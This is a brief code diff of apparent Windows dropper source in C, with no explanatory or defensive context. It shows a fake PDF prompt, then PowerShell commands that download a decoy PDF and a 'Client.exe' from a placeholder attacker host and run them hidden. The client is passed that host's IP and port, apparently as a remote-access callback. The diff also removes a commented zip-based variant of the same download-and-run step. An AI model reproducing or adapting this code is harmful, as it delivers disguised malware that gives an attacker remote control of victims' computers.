@@ -16,6 +16,6 @@ int main()
     MessageBox(NULL, "Open Archive with PDF Reader?", "Portable Document Format (PDF)", MB_OK);
    _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");Sleep(1);
    _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle minimized -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
-/* _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.zip', 'TempDir\\Client.zip') && cd TempDir && unzip Client.zip && cmd /R start /min Client.exe ip=LhOsT port=LpOrT"); */
    return 0;
 }
+
